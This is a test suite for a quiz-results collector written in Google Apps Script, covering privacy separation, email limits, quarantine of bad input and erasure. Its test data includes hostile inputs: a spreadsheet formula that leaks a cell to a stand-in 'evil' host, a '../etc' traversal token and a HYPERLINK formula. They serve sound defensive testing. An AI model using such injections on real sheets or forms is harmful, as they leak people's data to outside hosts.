// Runs the real Code.gs against in-memory Google services.  Usage:  node data/tests/collector.test.js
const assert = require('assert');
const { loadCollector } = require('./fake-gas');

// Controllable clock: the collector times each attempt from its own "start" record.
const realNow = Date.now;
let offset = 0;
Date.now = () => realNow() + offset;
const advance = (sec) => { offset += sec * 1000; };

let passed = 0;
function test(name, fn) {
  try { fn(); passed++; console.log('  ok  ' + name); }
  catch (e) { console.error('  FAIL ' + name + '\n       ' + (e && e.stack || e)); process.exitCode = 1; }
}
const fresh = (opts = {}) => { const c = loadCollector({ quiet: true, ...opts }); c.setup(); return c; };

let n = 0;
function complete(over = {}) {
  const pct = { certainty: 26.4, variety: 9.1, significance: 12.5, connection: 22.7, growth: 15.3, contribution: 14 };
  const base = {
    type: 'complete', session_id: 'sess-1234-abcd', assessment_id: 'aid-' + (++n) + '-' + Math.random().toString(16).slice(2, 10),
    source: 'qr', medium: 'qr', campaign: '', referrer: '', device: 'mobile', quiz_version: '1.0.0', hp: '',
    contact: { first_name: 'Sam', email: 'Sam@Example.com ', age: 34 },
    result: {
      primary: 'certainty', secondary: 'connection', archetype_key: 'certainty|connection', confidence: 'Balanced',
      fulfilment_state: 'Neutral', percentages: pct,
      raw_scores: { certainty: 22.1, variety: -3.2, significance: 4, connection: 18.6, growth: 8.3, contribution: 7 },
      fulfilment: { certainty: 3, variety: 4, significance: 2, connection: 5, growth: 3, contribution: 4 },
      quiz_version: '1.0.0', scoring_version: '1.0.0', duration_sec: 412, age_band: 3,
    },
  };
  return deepMerge(base, over);
}
function deepMerge(a, b) {
  const o = JSON.parse(JSON.stringify(a));
  for (const k of Object.keys(b)) o[k] = (b[k] && typeof b[k] === 'object' && !Array.isArray(b[k]) && o[k]) ? deepMerge(o[k], b[k]) : b[k];
  return o;
}
// A real attempt: start, a few minutes of answering, then complete.
function run(c, body, secs = 240) {
  c.post({ type: 'start', session_id: body.session_id, assessment_id: body.assessment_id, age_range: '25-34', quiz_version: '1.0.0' });
  advance(secs);
  return c.post(body);
}

console.log('collector');

test('setup creates both spreadsheets with the right tabs and a daily trigger', () => {
  const c = fresh();
  const contacts = c.store[c.props.CONTACTS_ID], results = c.store[c.props.RESULTS_ID];
  assert.deepStrictEqual(contacts.getSheets().map(s => s.getName()), ['Contacts', 'Report names', 'Quarantine', 'Erasure log']);
  assert.deepStrictEqual(results.getSheets().map(s => s.getName()), ['Assessments', 'Events']);
  assert.strictEqual(c.triggers.length, 1);
  c.setup(); // re-running is safe
  assert.strictEqual(c.triggers.length, 1);
  assert.strictEqual(Object.keys(c.store).length, 2);
});

test('complete: contact kept apart from results, email with revisit link, token returned', () => {
  const c = fresh();
  const res = run(c, complete());
  assert.strictEqual(res.ok, true, JSON.stringify(res));
  assert.strictEqual(res.emailed, true);
  assert.match(res.token, /^[A-Za-z0-9_-]{32}$/);
  const contacts = c.table('CONTACTS_ID', 'Contacts'), a = c.table('RESULTS_ID', 'Assessments');
  assert.strictEqual(contacts.length, 1); assert.strictEqual(a.length, 1);
  assert.strictEqual(contacts[0].email, 'sam@example.com');
  assert.strictEqual(a[0].participant_id, contacts[0].participant_id);
  assert.strictEqual(a[0].archetype, 'The Anchor');
  assert.strictEqual(a[0].age_range, '25-34');
  assert.strictEqual(a[0].email_status, 'sent');
  const resultsText = JSON.stringify(c.rows('RESULTS_ID', 'Assessments')) + JSON.stringify(c.rows('RESULTS_ID', 'Events'));
  assert.ok(!/sam@example\.com/i.test(resultsText) && !/"Sam"/.test(resultsText) && !resultsText.includes(res.token) && !/,34,/.test(resultsText));
  const m = c.mails[0];
  assert.strictEqual(m.to, 'sam@example.com'); assert.strictEqual(m.name, 'Scott Free');
  assert.strictEqual(m.subject, 'Your Six Human Needs results: The Anchor');
  assert.ok(m.htmlBody.includes('Hi Sam,'));
  assert.ok(m.htmlBody.includes('https://scottfree.live/human-needs-quiz/?r=' + res.token));
  assert.ok(m.htmlBody.includes('?r=' + res.token + '&amp;print=1'));
  assert.ok(m.body.includes('Revisit your full report: https://scottfree.live/human-needs-quiz/?r=' + res.token));
  assert.ok(!/Stay connected|personal space/.test(m.htmlBody), 'opt-in/account sections must be off');
  assert.ok(/one-off email/.test(m.htmlBody));
});

test('returning participant keeps the same ID; their stored name and age are not overwritten', () => {
  const c = fresh();
  const r1 = run(c, complete());
  const r2 = run(c, complete({ contact: { email: 'sam@example.com', first_name: 'Samantha', age: 40 } }));
  const a = c.table('RESULTS_ID', 'Assessments');
  assert.deepStrictEqual(a.map(x => x.attempt), [1, 2]);
  assert.deepStrictEqual(a.map(x => x.returning), ['no', 'yes']);
  assert.strictEqual(a[0].participant_id, a[1].participant_id);
  const p = c.table('CONTACTS_ID', 'Contacts');
  assert.strictEqual(p.length, 1); assert.strictEqual(p[0].first_name, 'Sam'); assert.strictEqual(p[0].age, 34);
  // each report shows the name given on that attempt
  assert.strictEqual(c.get({ action: 'report', token: r1.token }).result.first_name, 'Sam');
  assert.strictEqual(c.get({ action: 'report', token: r2.token }).result.first_name, 'Samantha');
});

test("someone else typing your email can't change the name on your report", () => {
  const c = fresh();
  const mine = run(c, complete({ contact: { first_name: 'Alex', email: 'alex@example.com' } }));
  run(c, complete({ contact: { first_name: 'Hacked', email: 'alex@example.com' } }));
  assert.strictEqual(c.get({ action: 'report', token: mine.token }).result.first_name, 'Alex');
});

test('same assessment sent twice (network retry) is stored and emailed once', () => {
  const c = fresh();
  const body = complete();
  run(c, body); const again = c.post(body);
  assert.strictEqual(again.dup, true); assert.strictEqual(again.emailed, true);
  assert.strictEqual(c.table('RESULTS_ID', 'Assessments').length, 1);
  assert.strictEqual(c.mails.length, 1);
});

test('no email unless the server saw the attempt start long enough ago', () => {
  const c = fresh();
  const noStart = c.post(complete());                 // no start record
  assert.strictEqual(noStart.ok, true); assert.strictEqual(noStart.emailed, false);
  const fast = run(c, complete(), 10);                // 10 seconds
  assert.strictEqual(fast.emailed, false);
  assert.deepStrictEqual(c.table('RESULTS_ID', 'Assessments').map(a => a.email_status), ['no_start', 'too_fast']);
  assert.strictEqual(c.mails.length, 0);
});

test('report link returns results and first name only, counts views', () => {
  const c = fresh();
  const { token } = run(c, complete());
  const rep = c.get({ action: 'report', token });
  assert.strictEqual(rep.ok, true);
  assert.strictEqual(rep.result.first_name, 'Sam');
  assert.strictEqual(rep.result.archetype_key, 'certainty|connection');
  assert.strictEqual(rep.result.percentages.certainty, 26.4);
  assert.strictEqual(rep.result.age_band, 3);
  assert.ok(!/example\.com/.test(JSON.stringify(rep)));
  c.get({ action: 'report', token });
  assert.strictEqual(c.table('RESULTS_ID', 'Assessments')[0].report_views, 2);
  assert.strictEqual(c.get({ action: 'report', token: 'x'.repeat(32) }).ok, false);
  assert.strictEqual(c.get({ action: 'report', token: '../etc' }).error, 'invalid');
});

test('feedback updates the assessment and logs an event', () => {
  const c = fresh();
  const body = complete(); run(c, body);
  assert.strictEqual(c.post({ type: 'feedback', assessment_id: body.assessment_id, session_id: 'sess-1234-abcd', accuracy: 'Very' }).ok, true);
  const a = c.table('RESULTS_ID', 'Assessments')[0];
  assert.strictEqual(a.accuracy, 'Very'); assert.strictEqual(a.accuracy_score, 4);
  assert.ok(c.table('RESULTS_ID', 'Events').some(e => e.event === 'feedback' && e.detail === 'Very'));
  assert.strictEqual(c.post({ type: 'feedback', assessment_id: body.assessment_id, accuracy: 'Kinda' }).ok, false);
  assert.strictEqual(c.post({ type: 'feedback', assessment_id: 'aid-not-there-123', accuracy: 'Very' }).error, 'not_found');
});

test('visit, start, age_gate and share events carry no personal details', () => {
  const c = fresh();
  c.post({ type: 'visit', session_id: 'sess-aaaa-1111', source: 'qr', medium: 'qr', device: 'mobile', quiz_version: '1.0.0' });
  c.post({ type: 'visit', session_id: 'sess-aaaa-1111', source: 'qr' }); // same session: counted once
  c.post({ type: 'start', session_id: 'sess-aaaa-1111', assessment_id: 'aid-0000-1111', age_range: '25-34', email: 'leak@example.com' });
  c.post({ type: 'age_gate', session_id: 'sess-aaaa-1111' });
  c.post({ type: 'share', session_id: 'sess-aaaa-1111', channel: 'WhatsApp', format: 'card' });
  const ev = c.table('RESULTS_ID', 'Events');
  assert.deepStrictEqual(ev.map(e => e.event), ['visit', 'start', 'age_gate', 'share']);
  assert.strictEqual(ev[1].detail, '25-34');
  assert.strictEqual(ev[3].detail, 'whatsapp'); assert.strictEqual(ev[3].value, 'card');
  assert.ok(!JSON.stringify(c.rows('RESULTS_ID', 'Events')).includes('leak@'));
});

test('rejects bad submissions into Quarantine and never emails them', () => {
  const c = fresh();
  const bad = [
    complete({ hp: 'http://spam' }),
    complete({ assessment_id: '' }),
    complete({ contact: { email: 'not-an-email' } }),
    complete({ contact: { email: '=IMAGE("https://evil/?"&C2&"@x.co")' } }),
    complete({ contact: { first_name: 'Visit evil.com now' } }),
    complete({ contact: { first_name: 'Sam2' } }),
    complete({ result: { archetype_key: 'variety|growth' } }),
    complete({ result: { confidence: 'Huge' } }),
    complete({ result: { percentages: { certainty: 80 } } }),
    complete({ result: { age_band: 1 } }),
    complete({ result: { quiz_version: '9.9.9' } }),
    complete({ result: { primary: 'connection', secondary: 'certainty' } }),
    { type: 'drop_table' },
  ];
  bad.forEach(b => assert.strictEqual(c.post(b).ok, false, JSON.stringify(b).slice(0, 120)));
  assert.strictEqual(c.post('{not json').error, 'bad_json');
  assert.strictEqual(c.post('x'.repeat(20000)).error, 'too_large');
  assert.strictEqual(c.table('RESULTS_ID', 'Assessments').length, 0);
  assert.strictEqual(c.mails.length, 0);
  const q = c.table('CONTACTS_ID', 'Quarantine');
  assert.strictEqual(q.length, bad.length);
  assert.ok(!/example\.com|"Sam/.test(JSON.stringify(q)), 'no names or emails in Quarantine');
});

test('under-18 submissions leave nothing about the person', () => {
  const c = fresh();
  c.post(complete({ contact: { age: 16, email: 'kid@example.com', first_name: 'Kid' } }));
  const q = c.table('CONTACTS_ID', 'Quarantine')[0];
  assert.strictEqual(q.reason, 'bad_age');
  assert.strictEqual(JSON.parse(q.payload).contact, null);
});

test('formula text is stored as plain text, even with leading spaces', () => {
  const c = fresh();
  c.post({ type: 'visit', session_id: 'sess-form-0001', source: '  =HYPERLINK("http://x","y")', medium: '+1+2', campaign: '@foo' });
  const ev = c.table('RESULTS_ID', 'Events')[0];
  [ev.source, ev.medium, ev.campaign].forEach(v => assert.ok(!/^[=+\-@]/.test(v), v));
});

test('email limits: per inbox (ignoring +tags and Gmail dots) and per day', () => {
  const c = fresh();
  const addrs = ['x.y+1@gmail.com', 'xy+2@gmail.com', 'x.y@googlemail.com', 'xy+4@gmail.com'];
  const out = addrs.map(e => run(c, complete({ contact: { email: e } })).emailed);
  assert.deepStrictEqual(out, [true, true, true, false]);
  assert.strictEqual(c.table('RESULTS_ID', 'Assessments').length, 4, 'results still saved');
  const d = fresh(); d.ctx.SETTINGS.MAX_EMAILS_PER_DAY = 2;
  const daily = ['a@x.com', 'b@x.com', 'c@x.com'].map(e => run(d, complete({ contact: { email: e } })).emailed);
  assert.deepStrictEqual(daily, [true, true, false]);
});

test('whole-site write caps', () => {
  const c = fresh(); c.ctx.SETTINGS.MAX_WRITES_PER_MINUTE = 3;
  const out = [1, 2, 3, 4].map(i => c.post({ type: 'visit', session_id: 'sess-cap-000' + i }).ok);
  assert.deepStrictEqual(out, [true, true, true, false]);
});

test('busy: if the lock is held, the quiz is told to try again', () => {
  const c = fresh({ lockBusy: true });
  assert.strictEqual(c.post({ type: 'visit', session_id: 'sess-busy-0001' }).error, 'busy');
});

test('a failed email is recorded but the results are still saved', () => {
  const c = fresh({ mailFails: true });
  const res = run(c, complete());
  assert.strictEqual(res.ok, true); assert.strictEqual(res.emailed, false);
  assert.strictEqual(c.table('RESULTS_ID', 'Assessments')[0].email_status, 'failed');
});

test('opt-in and account interest are off until switched on, then need the report token', () => {
  const c = fresh();
  const { token } = run(c, complete());
  assert.strictEqual(c.post({ type: 'opt_in', token, value: true }).error, 'not_enabled');
  c.ctx.SETTINGS.FEATURES.stayConnected = true; c.ctx.SETTINGS.FEATURES.accounts = true;
  assert.strictEqual(c.post({ type: 'opt_in', token: 'y'.repeat(32), value: true }).ok, false);
  assert.strictEqual(c.post({ type: 'opt_in', token, value: true }).ok, true);
  assert.strictEqual(c.post({ type: 'account_interest', token }).ok, true);
  const p = c.table('CONTACTS_ID', 'Contacts')[0];
  assert.strictEqual(p.marketing_opt_in, 'yes'); assert.ok(p.marketing_opt_in_at instanceof Date);
  assert.strictEqual(p.marketing_opt_in_wording, 'opt-in-v1'); assert.strictEqual(p.account_interest, 'yes');
  run(c, complete({ contact: { email: 'other@example.com' } }));
  assert.ok(/Stay connected/.test(c.mails[1].htmlBody) && /personal space/.test(c.mails[1].htmlBody));
});

test('retention clean-up, quarantine clean-up and erasure', () => {
  const c = fresh();
  const keep = run(c, complete({ contact: { email: 'keep@example.com', first_name: 'Kim' } }));
  const old = run(c, complete({ contact: { email: 'old@example.com', first_name: 'Olu' } }));
  c.post({ type: 'nope' });
  const rows = c.rows('CONTACTS_ID', 'Contacts');
  const seenCol = rows[0].indexOf('last_seen');
  const longAgo = new Date(); longAgo.setMonth(longAgo.getMonth() - 13);
  rows.find(r => r.includes('old@example.com'))[seenCol] = longAgo;
  c.rows('CONTACTS_ID', 'Quarantine')[1][0] = new Date(Date.now() - 40 * 86400000);
  assert.strictEqual(c.ctx.dailyCleanup(), 1);
  assert.deepStrictEqual(c.table('CONTACTS_ID', 'Contacts').map(x => x.email), ['keep@example.com']);
  assert.deepStrictEqual(c.table('CONTACTS_ID', 'Report names').map(x => x.first_name), ['Kim']);
  assert.strictEqual(c.table('CONTACTS_ID', 'Quarantine').length, 0);
  const rep = c.get({ action: 'report', token: old.token });
  assert.strictEqual(rep.ok, true); assert.strictEqual(rep.result.first_name, '');
  assert.strictEqual(c.ctx.eraseByEmail('KEEP@example.com'), 3); // contact + report name + 1 result unlinked
  assert.strictEqual(c.table('CONTACTS_ID', 'Contacts').length, 0);
  assert.strictEqual(c.table('CONTACTS_ID', 'Report names').length, 0);
  assert.strictEqual(c.get({ action: 'report', token: keep.token }).ok, false);
  assert.strictEqual(c.table('CONTACTS_ID', 'Erasure log').length, 2);
});

console.log(`\n${passed} passed${process.exitCode ? ', some FAILED' : ''}`);
